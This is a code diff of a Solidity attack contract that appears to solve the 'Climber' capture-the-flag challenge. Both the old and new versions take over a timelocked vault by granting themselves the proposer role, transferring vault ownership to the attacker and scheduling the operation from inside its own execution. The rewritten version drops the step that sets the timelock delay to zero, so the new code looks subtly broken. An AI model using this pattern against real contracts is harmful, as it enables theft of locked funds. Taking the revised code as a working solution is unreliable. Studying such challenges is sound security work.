@@ -1,74 +1,43 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.7;
 
-import "../../climber/ClimberVault.sol";
-
-interface IClimberTimelock {
-    function execute(
-        address[] calldata targets,
-        uint256[] calldata values,
-        bytes[] calldata dataElements,
-        bytes32 salt
-    ) external payable;
-
-    function schedule(
-        address[] calldata targets,
-        uint256[] calldata values,
-        bytes[] calldata dataElements,
-        bytes32 salt
-    ) external;
-}
+import { ClimberTimelock } from "../../climber/ClimberVault.sol";
 
 contract ClimberAttack {
-    address[] private targets;
-    uint256[] private values;
-    bytes[] private dataElements;
-    bytes32 private salt;
+    address payable private immutable timelock;
 
-    IClimberTimelock private timelock;
+    address[] private _targets = new address[](3);
+    uint256[] private _values = new uint256[](3);
+    bytes[] private _elements = new bytes[](3);
+    bytes32 private constant _salt = "anySalt";
 
-    address private vault;
-    address private attacker;
+    constructor(address payable _timelock, address _vault) {
+        timelock = _timelock;
 
-    constructor(
-        address _timelock,
-        address _vault,
-        address _attacker
-    ) {
-        timelock = IClimberTimelock(_timelock);
-        vault = _vault;
-        attacker = _attacker;
+        _targets[0] = _timelock;
+        _targets[1] = _vault;
+        _targets[2] = address(this);
+
+        _values[0] = 0;
+        _values[1] = 0;
+        _values[2] = 0;
+
+        _elements[0] = (
+            abi.encodeWithSignature(
+                "grantRole(bytes32,address)",
+                ClimberTimelock(_timelock).PROPOSER_ROLE(),
+                address(this)
+            )
+        );
+        _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
+        _elements[2] = abi.encodeWithSignature("schedule()");
     }
 
     function attack() external {
-        // update delay to 0 to execute tasks instantly
-        targets.push(address(timelock));
-        values.push(0);
-        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
-
-        // grant the proposer role to this contract to be able to schedule tasks
-        targets.push(address(timelock));
-        values.push(0);
-        dataElements.push(
-            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
-        );
-
-        // transfer ownership to the attacker
-        targets.push(address(vault));
-        values.push(0);
-        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));
-
-        // schedule the above tasks through this contract
-        dataElements.push(abi.encodeWithSignature("schedule()"));
-        values.push(0);
-        targets.push(address(this));
-
-        salt = keccak256("SALT");
-
-        timelock.execute(targets, values, dataElements, salt);
+        ClimberTimelock(timelock).execute(_targets, _values, _elements, _salt);
     }
 
     function schedule() external {
-        timelock.schedule(targets, values, dataElements, salt);
+        ClimberTimelock(timelock).schedule(_targets, _values, _elements, _salt);
     }
 }
